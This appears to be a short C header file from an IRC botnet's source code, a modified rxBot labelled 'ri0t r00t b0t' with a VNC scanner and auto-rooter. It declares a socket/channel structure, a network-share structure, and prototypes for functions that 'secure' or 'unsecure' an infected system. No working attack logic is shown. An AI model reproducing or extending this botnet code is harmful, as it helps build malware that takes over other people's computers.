/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


typedef struct SECURE 
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	int threadnum;
	BOOL secure;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SECURE;

typedef struct NetShares
{
	char *ShareName;
	char *SharePath;
		
} NetShares;

DWORD WINAPI SecureThread(LPVOID param);
BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent);
#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecureThread(LPVOID param);
#endif